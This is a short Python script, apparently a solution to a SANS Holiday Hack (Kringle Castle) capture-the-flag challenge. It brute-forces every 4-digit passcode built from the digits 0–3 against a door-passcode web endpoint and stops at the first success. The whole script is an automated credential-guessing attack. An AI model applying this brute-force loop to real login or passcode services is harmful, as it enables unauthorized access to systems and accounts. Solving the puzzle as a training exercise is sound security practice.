import requests
from itertools import product
import json

digits = ['0','1','2','3']
keyspace = [''.join(i) for i in list(product(digits, repeat=4))]
url ='https://doorpasscode.kringlecastle.com/checkpass.php?i='
rid = 'dcf77635-6971-4503-a8ea-87bcabf0c07c'
for code in keyspace:
    r = requests.get(f"{url}{code}&resourceId={rid}")
    r = json.loads(r.text)
    if r['success']:
        print(code, r)
        break;